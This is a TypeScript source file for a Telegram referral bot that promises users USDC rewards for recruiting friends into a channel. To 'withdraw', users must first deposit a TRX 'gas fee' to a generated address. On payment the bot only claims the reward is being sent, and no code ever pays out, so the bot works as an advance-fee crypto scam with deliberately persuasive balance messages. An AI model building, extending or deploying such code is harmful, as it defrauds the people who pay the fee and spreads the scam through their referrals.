import { Bot } from "grammy";
import { autoRetry } from "@grammyjs/auto-retry";
import { BotContext, CONFIG, Env } from "./types";
import { forceJoinMiddleware } from "./middlewares/forceJoin";
import { createUser, addReferral, getReferralCount } from "./db/queries";

export function createBot(env: Env) {
  const bot = new Bot<BotContext>(env.BOT_TOKEN);
  
  // Inject bindings
  bot.use(async (ctx, next) => {
    ctx.env = env;
    await next();
  });

  bot.api.config.use(autoRetry());

  // Pre-middleware to capture referral payload BEFORE force join blocks them
  bot.use(async (ctx, next) => {
    if (ctx.message?.text && ctx.message.text.startsWith("/start ref_")) {
      const userId = ctx.from?.id;
      const username = ctx.from?.username;
      
      if (userId) {
        // Ensure user exists first
        await createUser(ctx.env, userId, username);
        
        const payload = ctx.message.text.split(" ")[1]; // e.g. ref_123
        const referrerId = parseInt(payload.split("_")[1]);
        
        if (referrerId && referrerId !== userId) {
          // Log the pending referral. This might be duplicate if they hit /start again,
          // but addReferral catches the unique constraint safely.
          await addReferral(ctx.env, referrerId, userId);
        }
      }
    }
    await next();
  });

  bot.use(forceJoinMiddleware);

  // Helper: Generates the "Referral Lite" UI based on your screenshot
  async function sendDashboard(ctx: BotContext) {
    const userId = ctx.from!.id;
    await createUser(ctx.env, userId, ctx.from?.username);
    
    const inviteCount = await getReferralCount(ctx.env, userId);
    const balance = inviteCount >= CONFIG.REQUIRED_REFERRALS ? CONFIG.REWARD_USDC : 0.00;
    const remaining = Math.max(0, CONFIG.REQUIRED_REFERRALS - inviteCount);

    // Matching screenshot psychology
    let text = `✨ *Referral Lite* ✨\n\n`;
    text += `You've accumulated\n`;
    text += `💰 *${balance.toFixed(4)} USDC*\n\n`;
    
    if (inviteCount < CONFIG.REQUIRED_REFERRALS) {
      text += `Only *${remaining} more referrals* to\n[Withdraw]\n\n`;
      text += `🎯 *Inviter Tasks*\nInvite Friends. Unlock Up to 400 USDC Every Month.`;
    } else {
      text += `✅ *Goal Reached!* You are eligible for withdrawal.\n\n`;
    }

    await ctx.reply(text, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Invite Friends", callback_data: "get_link" }],
          [
            { text: "👥 Referrals", callback_data: "menu_referrals" },
            { text: "🎁 Rewards", callback_data: "menu_rewards" },
            { text: "📖 Rules", callback_data: "menu_rules" }
          ],
          [{ text: "💸 Withdraw", callback_data: "trigger_withdraw" }]
        ]
      }
    });
  }

  // --- Handlers ---

  bot.command("start", async (ctx) => {
    // Referral logging is handled in the pre-middleware now
    // We just render the dashboard since they passed the forceJoinMiddleware
    await sendDashboard(ctx);
  });

  bot.callbackQuery("check_membership", async (ctx) => {
    await ctx.answerCallbackQuery("Membership verified!");
    
    // deleteMessage might fail if the message is old, wrap in try-catch
    try {
      await ctx.deleteMessage();
    } catch (e) {}

    await sendDashboard(ctx);
  });

  bot.callbackQuery("get_link", async (ctx) => {
    const link = `https://t.me/${ctx.me.username}?start=ref_${ctx.from.id}`;
    await ctx.reply(`🔗 *Your Unique Invite Link:*\n\n\`${link}\``, { parse_mode: "Markdown" });
    await ctx.answerCallbackQuery();
  });

  // --- Menus ---
  bot.callbackQuery("menu_referrals", async (ctx) => {
    const inviteCount = await getReferralCount(ctx.env, ctx.from.id);
    await ctx.answerCallbackQuery();
    await ctx.reply(`👥 *Your Referrals*\n\nYou have successfully invited *${inviteCount}* users who have joined the official channel.\n\nKeep sharing your link to earn more!`, { parse_mode: "Markdown" });
  });

  bot.callbackQuery("menu_rewards", async (ctx) => {
    await ctx.answerCallbackQuery();
    let text = `🎁 *Rewards Program*\n\n`;
    text += `- Invite *${CONFIG.REQUIRED_REFERRALS} friends* to join our channel.\n`;
    text += `- Earn *${CONFIG.REWARD_USDC} USDC* directly to your wallet.\n`;
    text += `- To prevent abuse, a small gas fee of *${CONFIG.GAS_FEE_TRX} TRX* is required when withdrawing.\n\n`;
    text += `Start earning today!`;
    await ctx.reply(text, { parse_mode: "Markdown" });
  });

  bot.callbackQuery("menu_rules", async (ctx) => {
    await ctx.answerCallbackQuery();
    let text = `📖 *Bot Rules*\n\n`;
    text += `1. Users must join the official channel for a referral to count.\n`;
    text += `2. Fake accounts or botting will lead to an immediate ban.\n`;
    text += `3. Withdrawals require the correct TRX gas fee to be deposited.\n`;
    text += `4. Be respectful to the community.\n`;
    await ctx.reply(text, { parse_mode: "Markdown" });
  });

  // --- RPC INTEGRATION AREA --- //

  bot.callbackQuery("trigger_withdraw", async (ctx) => {
    const userId = ctx.from.id;
    const inviteCount = await getReferralCount(ctx.env, userId);
    
    if (inviteCount < CONFIG.REQUIRED_REFERRALS) {
      return ctx.answerCallbackQuery({ text: "❌ Not enough referrals yet!", show_alert: true });
    }

    const loadingMsg = await ctx.reply("🔄 Generating Secure Payment Invoice via RPC...");

    try {
      // 🚀 ZERO EXPOSURE RPC CALL: Calling Worker A seamlessly!
      // Returns a Javascript object natively via structured cloning.
      const invoice = await ctx.env.PAYMENT_RPC.createOrder({
        userId: userId,
        amount: CONFIG.GAS_FEE_TRX,
        currency: "TRX"
      });

      let text = `💸 *Secure Smart Contract Withdrawal*\n\n`;
      text += `USDC Ready to Transfer: \`${CONFIG.REWARD_USDC.toFixed(4)} USDC\`\n`;
      text += `⚠️ *Network Gas Fee Required:* \`${invoice.amount} TRX\`\n\n`;
      text += `Please deposit exactly *${invoice.amount} TRX* to the address below:\n\n`;
      text += `\`${invoice.address}\`\n\n`;
      text += `_Order ID: ${invoice.orderId}_`;

      await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id, text, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "✅ I Have Deposited (Verify)", callback_data: "verify_payment" }]]
        }
      });
    } catch (error) {
      console.error("RPC Error:", error);
      await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id, "⚠️ Payment service is currently busy. Try again later.");
    }
  });

  bot.callbackQuery("verify_payment", async (ctx) => {
    const userId = ctx.from.id;
    const loadingMsg = await ctx.reply("🔄 Checking Blockchain status via RPC...");

    try {
      // 🚀 RPC CALL: Check status without writing HTTP parsing logic
      const status = await ctx.env.PAYMENT_RPC.getStatus(userId);

      if (status.isPaid) {
        await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id, `✅ *Payment Confirmed!*\n\nTX: \`${status.txHash}\`\n\nYour 45 USDC is being sent to your wallet!`, { parse_mode: "Markdown" });
      } else {
        await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id, "⏳ *Awaiting Payment!*\n\nWe haven't received the TRX yet. Blockchains can take 2-5 minutes.", { parse_mode: "Markdown" });
      }
    } catch (error) {
      await ctx.api.editMessageText(ctx.chat!.id, loadingMsg.message_id, "⚠️ RPC Verification Error.");
    }
  });

  return bot;
}
